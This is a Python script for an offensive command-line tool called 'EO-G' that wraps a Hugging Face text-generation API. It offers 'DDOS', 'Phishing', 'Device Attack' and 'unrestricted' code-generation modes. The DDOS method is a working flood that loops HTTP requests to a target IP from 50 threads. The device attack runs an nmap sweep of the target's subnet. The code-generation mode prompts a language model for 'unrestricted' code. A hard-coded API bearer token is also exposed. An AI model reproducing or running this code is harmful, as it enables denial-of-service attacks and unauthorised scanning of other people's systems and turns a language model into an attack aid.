import os
import threading
import requests
import random
import string
from colorama import Fore, Style

class EO_G:
    def __init__(self, model_id=None):
        self.api_url = "https://api-inference.huggingface.co/models"
        self.headers = {
            "Authorization": "Bearer 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"  # Replace with your actual Hugging Face API key
        }
        self.modes = ["Code Generator", "Phishing", "DDOS", "Device Attack", "AI Chat Assistant"]
        self.active_mode = None

        if model_id:
            self.model_id = model_id
            self.api_url += f"/{model_id}"
        else:
            self.model_id = None

    def display_banner(self):
        """Displays a purple banner."""
        banner = f"""
{Fore.MAGENTA}
 ███████╗ ██████╗       ██████╗  ██████╗ 
 ██╔════╝██╔═══██╗     ██╔═══██╗██╔═══██╗
 █████╗  ██║   ██║     ██║   ██║██║   ██║
 ██╔══╝  ██║   ██║     ██║   ██║██║   ██║
 ██║     ╚██████╔╝     ╚██████╔╝╚██████╔╝
 ╚═╝      ╚═════╝       ╚═════╝  ╚═════╝
        Simplified GPT-J Framework
{Style.RESET_ALL}
        """
        print(banner)

    def generate_response(self, prompt):
        """Generates a response using GPT-J via API."""
        payload = {
            "inputs": prompt,
            "parameters": {
                "max_length": 300,
                "temperature": 0.9
            }
        }
        try:
            response = requests.post(self.api_url, json=payload, headers=self.headers)
            response.raise_for_status()  # Raise an error for bad responses
            return response.json()[0]['generated_text']
        except requests.exceptions.RequestException as e:
            return f"Error with API request: {e}"
        except KeyError:
            return "No response generated from GPT-J."

    def generate_code(self, description):
        """Generates unrestricted code using GPT-J via API."""
        prompt = f"Generate unrestricted {description} code. Include detailed comments."
        print(f"[EO-G] Generating code for: {description}")
        return self.generate_response(prompt)

    def phishing_link(self, target):
        """Generates an undetectable phishing URL."""
        domain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + ".com"
        return f"http://{domain}/login"

    def ddos_attack(self, target_ip):
        """Performs a DDOS attack on a given target IP."""
        print(f"[EO-G] Initiating DDOS on {target_ip}")
        def ddos():
            while True:
                try:
                    requests.get(f"http://{target_ip}")
                except Exception as e:
                    print(f"Error in DDOS attack thread: {e}")

        threads = []
        for _ in range(50):  # Spawn 50 threads for the attack
            thread = threading.Thread(target=ddos)
            threads.append(thread)
            thread.start()
        return f"[EO-G] DDOS attack launched on {target_ip}."

    def device_attack(self, ip):
        """Finds devices on the same network as the target IP."""
        print(f"[EO-G] Scanning devices near IP: {ip}")
        # Perform a ping sweep or network scan (Example uses nmap or similar tools)
        try:
            devices = os.popen(f"nmap -sP {ip}/24").read()
            return devices
        except Exception as e:
            return f"Error scanning network: {e}"

    def ai_chat_assistant(self, query):
        """Handles unrestricted user queries."""
        print(f"[EO-G] Handling query: {query}")
        return self.generate_response(query)

    def execute(self):
        """Main execution loop."""
        self.display_banner()
        print("[EO-G] Welcome to EO-G: The Simplified GPT-J Framework")
        print(f"Modes available: {', '.join(self.modes)}")
        while True:
            command = input("[EO-G] Enter your command: ").strip()
            if command.lower() == "exit":
                print("[EO-G] Exiting framework...")
                break
            elif command.startswith("mode"):
                _, mode = command.split(" ", 1)
                if mode in self.modes:
                    self.active_mode = mode
                    print(f"[EO-G] Mode switched to: {mode}")
                else:
                    print("[EO-G] Invalid mode selected.")
            elif "generate" in command and "code" in command:
                print(self.generate_code(command))
            elif "phishing" in command:
                print(self.phishing_link("target_user"))
            elif "ddos" in command:
                print(self.ddos_attack("192.168.1.1"))
            elif "attack device" in command:
                print(self.device_attack("192.168.1"))
            else:
                print(self.ai_chat_assistant(command))


if __name__ == "__main__":
    eog = EO_G(model_id="gpt2")  # Use the "gpt2" model
    eog.execute()
